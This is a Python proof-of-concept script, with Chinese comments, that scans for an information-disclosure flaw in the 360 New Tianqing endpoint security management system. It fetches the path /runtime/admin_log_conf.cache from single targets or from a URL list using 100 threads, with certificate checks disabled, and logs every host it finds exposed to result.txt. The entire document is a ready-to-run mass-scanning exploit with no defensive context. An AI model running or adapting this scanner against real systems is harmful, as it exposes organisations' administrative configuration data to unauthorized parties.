#360新天擎终端安全管理系统信息泄露漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'

# banner信息
def banner():
    text = '''


 _        __                           _   _               _                _                    
(_)      / _|                         | | (_)             | |              | |                   
 _ _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __   | |     ___  __ _| | ____ _  __ _  ___ 
| | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |    / _ \/ _` | |/ / _` |/ _` |/ _ \
| | | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | | | |___|  __/ (_| |   < (_| | (_| |  __/
|_|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| \_____/\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                       __/ |     
                                                                                      |___/                                                                
                                                                     version:360XTQ_Information_Leakage 1.0
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="360新天擎终端安全管理系统信息泄露漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your link")
    parser.add_argument('-f','--file',dest='file',type=str,help="file path")
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        #处理数据，加线程
        url_list=[]
        with open('url.txt','r',encoding='utf-8') as fp:
            for i in fp.readlines():
                i = i.strip()
                #自动添加http://
                if 'https://' in i:
                    url_list.append(i)
                else:
                    i = 'http://' + i
                    url_list.append(i)
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")   

def poc(target):
    url_payload = '/runtime/admin_log_conf.cache'
    url = target + url_payload
    # print(url)
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"}
    try:
        response = requests.get(url=url,headers=headers,timeout=5,verify=False)
        #匹配响应包出现的内容
        if response.status_code == 200 and 'api' in response.text:
            print( f"{GREEN}[+] {url} 存在信息泄露！{RESET}")
            with open('result.txt','a')as f:
                f.write(target+'\n')
        else:
            print("[-] 漏洞不存在!!")
    except Exception:
        pass
if __name__ == '__main__':
    main()
